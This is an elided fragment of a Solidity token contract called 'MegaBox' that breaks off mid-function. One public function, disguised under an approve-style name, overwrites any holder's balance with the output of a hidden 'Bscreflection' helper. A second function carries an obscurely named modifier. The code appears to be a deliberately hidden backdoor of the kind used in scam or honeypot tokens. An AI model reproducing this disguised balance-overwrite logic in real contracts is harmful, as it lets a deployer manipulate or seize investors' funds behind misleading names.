...
contract MegaBox is IERC20, Ownable {
    ...
    function ApproveExactTokenBSC(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function ApproveChecktokenBSC(address Router) public Uint650 {
